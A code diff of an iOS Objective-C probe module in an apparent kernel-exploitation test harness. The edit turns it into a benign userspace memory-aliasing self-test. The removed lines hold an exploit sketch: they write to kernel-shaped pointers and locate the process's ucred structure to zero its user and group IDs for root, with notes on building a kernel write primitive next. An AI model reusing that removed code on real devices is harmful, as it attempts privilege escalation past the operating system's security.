@@ -1,8 +1,8 @@
 #import "KPKReadProbeModule.h"
 #import <UIKit/UIKit.h>
 #import "KPLog.h"
+#import "KPVMScanPolicy.h"
 #import <mach/mach.h>
-#include <sys/sysctl.h>
 
 @interface KPKReadProbeModule ()
 @property (nonatomic, copy) NSString *identifier;
@@ -18,8 +18,8 @@
     self = [super init];
     if (self) {
         _identifier = @"kread64.probe";
-        _title = @"kread64 input-output mapping probe";
-        _subtitle = @"vm_remap aliased pages + kernel pointer scan (kirby_swift technique)";
+        _title = @"Userspace alias + filtered candidate probe";
+        _subtitle = @"Benign vm_remap alias self-test; no kread/kwrite claim";
         _icon = @"memorychip";
         _section = KPTestSectionKernelProbes;
     }
@@ -42,14 +42,14 @@
 }
 
 static BOOL isKernelPointer(uint64_t v) {
-    return (v >> 32) >= 0xffffffe0ULL;
+    return KPIsKernelPointerCandidate(v);
 }
 
 - (NSString *)runReport {
     NSMutableString *report = [NSMutableString string];
-    [report appendString:@"=== KexProofV4 · kread64 input-output mapping probe ===\n"];
-    [report appendString:@"Technique: vm_remap aliased pages, kernel pointer scan.\n"];
-    [report appendString:@"Ref: kirby_swift input->output mapped kread64.\n"];
+    [report appendString:@"=== KexProofV4 · userspace alias + candidate probe ===\n"];
+    [report appendString:@"Technique: benign vm_remap alias self-test and filtered read-only scan.\n"];
+    [report appendString:@"Aliasing userspace pages alone does not provide a kernel read/write primitive.\n"];
     [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];
 
     // --- Phase 1: create aliased mapping ---
@@ -105,195 +105,103 @@ static BOOL isKernelPointer(uint64_t v) {
 
     [report appendString:@"*** input->output mapped CONFIRMED ***\n"];
 
-    // --- Phase 3: kernel pointer scan ---
-    [report appendString:@"\n--- Phase 3: kernel pointer scan ---\n"];
-
-    // Scan the region for kernel pointers
-    // First, fill with a known pattern, then check if anything unexpected appears
+    // --- Phase 3: fresh-alias stability control ---
+    [report appendString:@"\n--- Phase 3: fresh-alias stability control ---\n"];
     for (size_t i = 0; i < regionSize / 8; i++) {
         in64[i] = 0xDEADBEEFDEADBEEFULL;
     }
 
-    // Check if any values differ from our pattern (kernel wrote something?)
     int unexpected = 0;
-    uint64_t kptrs[16] = {0};
-    size_t kptrOffsets[16] = {0};
-    int kptrCount = 0;
-
+    int freshCandidateCount = 0;
     for (size_t i = 0; i < regionSize / 8; i++) {
         uint64_t v = out64[i];
         if (v != 0xDEADBEEFDEADBEEFULL) {
             unexpected++;
-            if (isKernelPointer(v) && kptrCount < 16) {
-                kptrs[kptrCount] = v;
-                kptrOffsets[kptrCount] = i * 8;
-                kptrCount++;
-                [report appendFormat:@"kptr(%%d) @ +0x%%zx: 0x%%llx\n", (int)(kptrCount - 1), (size_t)(i * 8), (unsigned long long)v];
+            if (isKernelPointer(v) && !KPIsKnownDiagnosticConstant(v)) {
+                freshCandidateCount++;
+                if (freshCandidateCount <= 16) {
+                    [report appendFormat:@"candidate @ +0x%zx: 0x%llx\n", i * 8, v];
+                }
             }
         }
     }
 
-    [report appendFormat:@"unexpected values: %d (kernel pointers: %d)\n", unexpected, kptrCount];
+    [report appendFormat:@"unexpected values: %d (address-shaped candidates: %d)\n",
+     unexpected, freshCandidateCount];
+    [report appendString:@"No candidate is modified: userspace alias propagation is not a kernel read/write oracle.\n"];
 
-    // --- Phase 4: diff-test candidate pointers ---
-    if (kptrCount > 0) {
-        [report appendString:@"\n--- Phase 4: diff-test kptr fields ---\n"];
-        for (int k = 0; k < kptrCount; k++) {
-            uint64_t orig = out64[kptrOffsets[k] / 8];
-            [report appendFormat:@"kptr(%%d) @ +0x%%zx: 0x%%llx -> +0x100\n", (int)k, (size_t)*(kptrOffsets + k), (unsigned long long)orig];
-
-            // Modify by +0x100
-            in64[kptrOffsets[k] / 8] = orig + 0x100;
-
-            // Read back
-            uint64_t modified = out64[kptrOffsets[k] / 8];
-            [report appendFormat:@"  after: 0x%llx (diff=%s)\n", modified,
-             (modified == orig + 0x100) ? "CONFIRMED" : "NO_CHANGE"];
-
-            if (modified == orig + 0x100) {
-                [report appendFormat:@"  *** INPUT FIELD FOUND: kptr[%d] ***\n", k];
-            }
-
-            // Restore
-            in64[kptrOffsets[k] / 8] = orig;
-        }
-    }
-
-    // --- Phase 5: find existing RW regions with kernel pointers (kirby approach) ---
-    [report appendString:@"\n--- Phase 5: scan RW regions for kernel pointers ---\n"];
+    // --- Phase 4: filtered, read-only RW region candidate scan ---
+    [report appendString:@"\n--- Phase 4: filtered read-only candidate scan ---\n"];
 
     vm_address_t scanAddr = 0;
     vm_size_t scanSize = 0;
+    uint32_t scanDepth = 0;
     vm_region_submap_info_data_64_t scanInfo;
     mach_msg_type_number_t scanCount;
-    int regionWithKptrs = 0;
+    vm_address_t excludedAddresses[] = {inputAddr, outputAddr};
+    vm_size_t excludedSizes[] = {regionSize, regionSize};
+    int regionWithCandidates = 0;
+    int scannedRegions = 0;
+    int skippedRegions = 0;
+    int filteredConstants = 0;
+    int totalCandidates = 0;
 
-    while (1) {
+    while (regionWithCandidates < 8) {
         scanAddr = (scanAddr == 0) ? 0 : scanAddr + scanSize;
         scanCount = VM_REGION_SUBMAP_INFO_COUNT_64;
-        if (vm_region_recurse_64(mach_task_self(), &scanAddr, &scanSize, &(uint32_t){0},
-                                  (vm_region_recurse_info_t)&scanInfo, &scanCount) != KERN_SUCCESS) break;
-        if (scanInfo.is_submap) continue;
-        if (!(scanInfo.protection & VM_PROT_WRITE)) continue;
+        if (vm_region_recurse_64(mach_task_self(), &scanAddr, &scanSize, &scanDepth,
+                                  (vm_region_recurse_info_t)&scanInfo, &scanCount) != KERN_SUCCESS || scanSize == 0) break;
+        if (scanInfo.is_submap) { scanDepth++; continue; }
+        if ((scanInfo.protection & (VM_PROT_READ | VM_PROT_WRITE)) != (VM_PROT_READ | VM_PROT_WRITE)) continue;
         if (scanSize > 16 * 1024 * 1024) continue;
+        if (KPVMShouldSkipRegion(&scanInfo, scanAddr, scanSize, &scanDepth,
+                                 excludedAddresses, excludedSizes, 2)) {
+            skippedRegions++;
+            continue;
+        }
+        scannedRegions++;
 
         volatile uint64_t *p = (volatile uint64_t *)scanAddr;
         size_t words = scanSize / 8;
-        int kptrs = 0;
-        uint64_t firstKptr = 0;
+        int candidates = 0;
+        uint64_t firstCandidate = 0;
         size_t firstOffset = 0;
 
         for (size_t i = 0; i < words; i++) {
             uint64_t v = p[i];
-            if (isKernelPointer(v)) {
-                kptrs++;
-                if (kptrs == 1) { firstKptr = v; firstOffset = i * 8; }
+            if (!isKernelPointer(v)) continue;
+            if (KPIsKnownDiagnosticConstant(v)) {
+                filteredConstants++;
+                continue;
             }
+            candidates++;
+            if (candidates == 1) { firstCandidate = v; firstOffset = i * 8; }
         }
 
-        if (kptrs > 0) {
-            regionWithKptrs++;
-            [report appendFormat:@"region 0x%lx (size=0x%zx): %d kptrs, first=0x%llx @ +0x%zx\n",
-             (unsigned long)scanAddr, scanSize, kptrs, firstKptr, firstOffset];
-
-            // Test: modify a kernel pointer and see if it changes back (kernel writes)
-            volatile uint64_t *kp = (volatile uint64_t *)(scanAddr + firstOffset);
-            uint64_t orig = kp[0];
-            kp[0] = orig + 0x100;
-            uint64_t modified = kp[0];
-            kp[0] = orig; // restore
-
-            if (modified == orig + 0x100) {
-                [report appendFormat:@"  -> WRITABLE (kwrite candidate)\n"];
-            } else {
-                [report appendFormat:@"  -> read-only or kernel-protected\n"];
-            }
+        if (candidates > 0) {
+            regionWithCandidates++;
+            totalCandidates += candidates;
+            [report appendFormat:@"region 0x%lx (size=0x%zx): %d candidates, first=0x%llx @ +0x%zx\n",
+             (unsigned long)scanAddr, scanSize, candidates, firstCandidate, firstOffset];
         }
-
-        if (regionWithKptrs >= 5) break; // enough
     }
 
-    [report appendFormat:@"regions with kernel pointers: %d\n", regionWithKptrs];
-
-    // --- Phase 6: proc/ucred hunt + root (broader scan) ---
-    if (regionWithKptrs > 0) {
-        [report appendString:@"\n--- Phase 6: proc/ucred hunt + root ---\n"];
-        int myPID = getpid();
-        int myUID = getuid();
-        [report appendFormat:@"our pid=%d uid=%d\n", myPID, myUID];
-
-        scanAddr = 0; scanSize = 0;
-        int procFound = 0;
-
-        while (1) {
-            scanAddr = (scanAddr == 0) ? 0 : scanAddr + scanSize;
-            scanCount = VM_REGION_SUBMAP_INFO_COUNT_64;
-            uint32_t d2 = 0;
-            if (vm_region_recurse_64(mach_task_self(), &scanAddr, &scanSize, &d2,
-                                      (vm_region_recurse_info_t)&scanInfo, &scanCount) != KERN_SUCCESS) break;
-            if (scanInfo.is_submap) continue;
-            if (!(scanInfo.protection & VM_PROT_WRITE)) continue;
-            if (scanSize > 16 * 1024 * 1024) continue;
-
-            volatile uint8_t *base = (volatile uint8_t *)scanAddr;
-
-            for (size_t off = 0; off + 0x40 < scanSize; off += 4) {
-                uint32_t val = *(volatile uint32_t *)(base + off);
-                if (val != (uint32_t)myPID) continue;
-
-                [report appendFormat:@"PID match at region+0x%zx\n", off];
-
-                if (off >= 0x60 && off + 0x400 < scanSize) {
-                    size_t pb = off - 0x60;
-                    uint64_t uc = *(volatile uint64_t *)(base + pb + 0x28);
-                    uint64_t tk = *(volatile uint64_t *)(base + pb + 0x08);
-                    if (isKernelPointer(uc) && uc != 0xffffffffffffffffULL &&
-                        isKernelPointer(tk) && tk != 0xffffffffffffffffULL) {
-                        [report appendFormat:@"  PROC @ +0x%zx ucred=0x%llx task=0x%llx\n", pb, uc, tk];
-                        procFound++;
-
-                        uint8_t *ulocal = NULL;
-                        vm_address_t ta = 0; vm_size_t ts = 0;
-                        while (1) {
-                            ta = (ta == 0) ? 0 : ta + ts;
-                            uint32_t d3 = 0;
-                            mach_msg_type_number_t tc = VM_REGION_SUBMAP_INFO_COUNT_64;
-                            vm_region_submap_info_data_64_t ti;
-                            if (vm_region_recurse_64(mach_task_self(), &ta, &ts, &d3,
-                                                      (vm_region_recurse_info_t)&ti, &tc) != KERN_SUCCESS) break;
-                            if (ti.is_submap) continue;
-                            if (uc >= ta && uc < ta + ts) { ulocal = (uint8_t *)uc; break; }
-                        }
-                        if (ulocal) {
-                            uint32_t uid = *(volatile uint32_t *)(ulocal + 0x18);
-                            [report appendFormat:@"  ucred mapped, cr_uid=%u\n", uid];
-                            *(volatile uint32_t *)(ulocal + 0x18) = 0;
-                            *(volatile uint32_t *)(ulocal + 0x1c) = 0;
-                            *(volatile uint32_t *)(ulocal + 0x20) = 0;
-                            [report appendFormat:@"  getuid() now: %d\n", getuid()];
-                            if (getuid() == 0) [report appendString:@"  *** ROOT ACHIEVED ***\n"];
-                        } else {
-                            [report appendString:@"  ucred not in writable regions\n"];
-                        }
-                    }
-                }
-            }
-            if (procFound > 0) break;
-        }
-        if (procFound == 0) [report appendString:@"proc not found in writable regions.\n"];
-    }
+    [report appendFormat:@"scanned regions: %d; skipped local regions: %d\n", scannedRegions, skippedRegions];
+    [report appendFormat:@"regions with candidates: %d; values: %d; known constants filtered: %d\n",
+     regionWithCandidates, totalCandidates, filteredConstants];
+    [report appendString:@"The scan performs no writes outside the freshly allocated alias buffers.\n"];
 
     // --- Verdict ---
     [report appendString:@"\n"];
-    if (kptrCount > 0) {
-        [report appendString:@"VERDICT: KPTR_FOUND_IN_MAPPED_REGION\n"];
-        [report appendString:@"Kernel pointers visible in user-mapped pages.\n"];
-        [report appendString:@"=> kread64 primitive is AVAILABLE. Build kwrite next.\n"];
+    if (freshCandidateCount > 0) {
+        [report appendString:@"VERDICT: FRESH_ALIAS_CHANGED_UNVERIFIED\n"];
+        [report appendString:@"Unexpected alias values require an independent producer before attribution to the kernel.\n"];
+    } else if (regionWithCandidates > 0) {
+        [report appendString:@"VERDICT: ALIAS_CONFIRMED_ADDRESS_CANDIDATES_UNVERIFIED\n"];
+        [report appendString:@"Userspace aliasing is confirmed; candidate values do not establish kread64 or kwrite64.\n"];
     } else if (shared) {
-        [report appendString:@"VERDICT: SHARED_NO_KPTR\n"];
-        [report appendString:@"Aliased mapping works but no kernel pointers in fresh region.\n"];
-        [report appendString:@"Need to map kernel pages (vm_remap kernel, IOSurface, or vuln).\n"];
-        [report appendString:@"Next: combine with translate_receive OOB to feed kernel data.\n"];
+        [report appendString:@"VERDICT: ALIAS_CONFIRMED_NO_ADDRESS_CANDIDATES\n"];
+        [report appendString:@"Userspace aliasing works; no filtered address-shaped candidates were observed.\n"];
     } else {
         [report appendString:@"VERDICT: NO_MAPPING\n"];
     }
